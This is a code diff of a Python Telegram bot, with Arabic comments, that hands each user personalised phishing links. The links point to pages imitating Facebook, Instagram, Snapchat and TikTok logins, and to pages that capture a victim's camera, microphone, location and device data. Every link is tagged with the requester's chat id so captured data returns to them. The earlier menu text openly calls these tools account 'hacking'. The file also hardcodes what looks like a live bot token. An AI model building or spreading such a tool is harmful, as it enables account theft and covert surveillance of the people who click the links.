@@ -6,7 +6,7 @@ import os
 import logging
 import time
 
-# منع التنبيهات الحمراء
+# كتم التنبيهات الحمراء المزعجة
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
 
@@ -23,11 +23,11 @@ def keep_alive():
     t = Thread(target=run)
     t.start()
 
-# --- حط التوكن الجديد (اللي أخذته من BotFather) هون ---
+# --- إعدادات البوت والتوكن ---
 TOKEN = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE'
 bot = telebot.TeleBot(TOKEN)
 
-# تنظيف الـ Webhook القديم عشان نخلص من الـ 409
+# حل مشكلة الـ Conflict 409 وتنظيف الـ Webhook
 bot.remove_webhook()
 time.sleep(1)
 
@@ -43,9 +43,11 @@ def send_welcome(message):
     uid = message.chat.id
     first_name = message.from_user.first_name
     hunter = first_name.replace(" ", "_")
-    base = "https://m-y-9-tech.github.io/fb/" # رابط الـ GitHub Pages تبعك
-
-    # قائمة الـ 8 روابط اللي طلبتهم
+    
+    # رابط الـ GitHub Pages الأساسي تبعك
+    base = "https://m-y-9-tech.github.io/fb/" 
+    
+    # الروابط الـ 8 المطلوبة بلمسة جيل 2009
     links = {
         "fb": short_link(f"{base}fb.html?id={uid}&hunter={hunter}"),
         "ig": short_link(f"{base}ig.html?id={uid}&hunter={hunter}"),
@@ -58,26 +60,22 @@ def send_welcome(message):
     }
 
     msg = f"""
-🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | أهلاً بك {first_name}
+🚀 نـ^ـظـ^ـام M.Y.9 الـ^ـمـ^ـطـ^ـور | أهلاً بك {first_name}
 
-👤 Developer: 𝔸𝕓𝕦 𝕊𝕒𝕟𝕒𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚
-
-⚠️ رابـط المـطـور لـتـفـعـيـل الأوامـر (إجـبـاري) 💀🔥:
-https://www.instagram.com/m_y_.9/?hl=ar#
+👤 Dev: 𝔸𝕓𝕦 𝕊𝕒𝕟𝕒𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚
+🔴 Instagram: https://www.instagram.com/m_y_.9/?hl=ar#
 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-💎 قـ^ـائـ^ـمـ^ـة الأدوات الـ^ـمـ^ـفـ^ـعـ^ـلـ^ـة 💎
+💎 الأدوات الـ^ـمـ^ـفـ^ـعـ^ـلـ^ـة (جيل 2009) 💎
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-
-🔹 اختـ^ـراق الفيـ^ـسبـ^ـوك 🔐: `{links['fb']}`
-🔹 اختـ^ـراق الانـ^ـستـ^ـقـ^ـرام 🛡️: `{links['ig']}`
-🔹 اختـ^ـراق سـ^ـنـ^ـاب شـ^ـات 👻: `{links['snap']}`
-🔹 اختـ^ـراق تـيـك تـوك 🎵: `{links['tik']}`
-🔹 اختـ^ـراق الكـ^ـامـ^ـيـ^ـرا 📸: `{links['cam']}`
+🔹 فيـ^ـسبـ^ـوك 🔐: `{links['fb']}`
+🔹 انـ^ـستـ^ـقـ^ـرام 🛡️: `{links['ig']}`
+🔹 سـ^ـنـ^ـاب شـ^ـات 👻: `{links['snap']}`
+🔹 تـيـك تـوك 🎵: `{links['tik']}`
+🔹 الكـ^ـامـ^ـيـ^ـرا 📸: `{links['cam']}`
 🔹 تـسـجـيـل الـصـوت 🎤: `{links['mic']}`
-🔹 تـحـديـد الـمـوقـع 📍: `{links['loc']}`
-🔹 سـحـب مـعـلـومـات الـنـظـام 📱: `{links['sys']}`
-
+🔹 تـحـديـد المـ^ـوقـ^ـع 📍: `{links['loc']}`
+🔹 مـ^ـعـ^ـلـ^ـومـ^ـات الـ^ـجـ^ـهـ^ـاز 📱: `{links['sys']}`
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 ⚙️ الـ^ـحـ^ـالـ^ـة: مـ^ـتـ^ـصـ^ـل..
     """
@@ -85,5 +83,5 @@ https://www.instagram.com/m_y_.9/?hl=ar#
 
 if __name__ == "__main__":
     keep_alive()
-    print("🚀 System M.Y.9 is Running with 8 Tools!")
-    bot.infinity_polling()
+    print("🚀 M.Y.9 System is LIVE now!")
+    bot.infinity_polling(timeout=20, long_polling_timeout=10)
